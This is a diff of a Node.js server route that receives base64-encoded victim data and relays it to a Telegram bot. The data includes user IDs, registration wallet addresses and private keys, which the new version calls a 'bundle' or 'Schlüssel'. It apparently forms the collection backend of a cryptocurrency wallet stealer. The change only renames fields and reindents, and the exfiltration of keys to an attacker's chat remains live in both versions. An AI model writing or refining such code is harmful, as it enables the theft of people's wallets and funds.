@@ -20,26 +20,25 @@ app.get('/data/:payload', async (req, res) => {
             Buffer.from(payload, 'base64').toString('utf8')
         );
 
-        console.log('--- RAW PAYLOAD RECEIVED ---');
-        console.log(data);
-        console.log('Private Key found:', data.privateKey);
+       console.log('--- RAW PAYLOAD RECEIVED ---');
+console.log(data);
 
-        await fetch(
-            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-            {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    chat_id: process.env.TELEGRAM_CHAT_ID,
-                    text: `Neue Daten erhalten:
+console.log('Schlüssel gefunden:', data.bundle); 
+
+await fetch(
+    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+    {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: process.env.TELEGRAM_CHAT_ID,
+            text: `Neue Daten erhalten:
 User: ${data.user?.userId || "unbekannt"}
 Wallet: ${data.user?.registrationWallet || "unbekannt"}
-Private Key: ${data.privateKey || "Nicht gefunden!"}`
-                })
-            }
-        );
+Schlüssel: ${data.bundle || "Nicht gefunden!"}` 
+        })
+    }
+);
 
         res.status(200).json({
             success: true,
